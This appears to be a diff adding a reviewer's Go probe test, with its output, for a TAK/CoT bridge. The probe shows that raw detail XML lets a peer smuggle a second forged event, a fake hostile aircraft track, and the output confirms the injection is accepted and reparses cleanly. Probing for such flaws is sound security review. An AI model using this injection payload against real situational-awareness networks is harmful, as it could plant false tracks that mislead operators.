@@ -1,0 +1,22 @@
+# Reviewer probe: v1 xmlDetail is emitted raw; a peer can smuggle a second <event> (copy of the package in scratchpad, worktree untouched)
+package main
+import ("testing";"fmt")
+func TestProbe(t *testing.T){
+ ev := &Event{Type:"a-f-G-U-C",UID:"ANDROID-evil",How:"m-g",SendTime:1,StartTime:1,StaleTime:2,
+  Detail: Detail{XML:`<contact callsign="x"/></detail></event><event version="2.0" uid="OM.aircraft.fake" type="a-h-A" how="m-g" time="2026-10-29T00:00:00Z" start="2026-10-29T00:00:00Z" stale="2026-10-30T00:00:00Z"><point lat="1" lon="1" hae="0" ce="1" le="1"/><detail>`}}
+ wire := EncodeMesh(&TakMessage{Event: ev})
+ got,_,_,err := Decode(wire)
+ if err!=nil { t.Fatal(err) }
+ x := got.MarshalCotXML(false)
+ fmt.Printf("%s\ninjectAllowed=%v\n", x, injectAllowed(got))
+ _, perr := ParseCotXML(x)
+ fmt.Printf("reparse err=%v\n", perr)
+}
+
+=== RUN   TestProbe
+<event version="2.0" uid="ANDROID-evil" type="a-f-G-U-C" how="m-g" time="1970-01-01T00:00:00.001Z" start="1970-01-01T00:00:00.001Z" stale="1970-01-01T00:00:00.002Z"><point lat="0" lon="0" hae="0" ce="0" le="0"/><detail><contact callsign="x"/></detail></event><event version="2.0" uid="OM.aircraft.fake" type="a-h-A" how="m-g" time="2026-10-29T00:00:00Z" start="2026-10-29T00:00:00Z" stale="2026-10-30T00:00:00Z"><point lat="1" lon="1" hae="0" ce="1" le="1"/><detail></detail></event>
+injectAllowed=true
+reparse err=<nil>
+--- PASS: TestProbe (0.00s)
+PASS
+ok  	github.com/onemindos/omos-bridge/bridges/tak	0.228s
